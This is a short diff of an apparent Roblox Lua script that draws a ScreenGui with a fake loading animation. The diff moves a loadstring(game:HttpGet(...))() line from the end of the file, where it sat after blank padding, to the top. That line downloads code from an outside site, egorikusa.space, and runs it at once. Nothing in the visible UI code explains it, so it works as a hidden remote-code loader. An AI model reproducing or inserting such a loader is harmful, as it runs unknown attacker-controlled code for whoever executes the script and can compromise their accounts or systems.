@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
+
+
 -- Create the ScreenGui and Frame
 local screenGui = Instance.new("ScreenGui")
 local frame = Instance.new("Frame")
@@ -79,9 +82,3 @@ local function simulateLoading()
 end
 
 simulateLoading()
-
-
-
-
-
-loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
